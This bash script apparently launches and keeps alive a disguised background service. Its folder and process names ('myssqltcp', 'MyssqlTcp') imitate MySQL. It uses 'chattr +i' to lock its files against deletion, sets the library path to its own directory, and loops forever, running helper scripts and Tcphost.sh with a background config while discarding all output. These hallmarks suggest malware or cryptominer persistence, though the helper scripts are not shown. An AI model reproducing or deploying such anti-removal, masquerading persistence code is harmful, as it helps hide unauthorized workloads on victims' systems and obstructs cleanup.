#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

chattr +i myssqltcp/*

export LD_LIBRARY_PATH=$HOME/myssqltcp/
monitoring_process="MyssqlTcp"
while true; do
        if pgrep -x "$monitoring_process" > /dev/null; then
            ./addconf.sh
            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
            sleep 10
        fi
        ./logserver.sh
        sleep 5
done
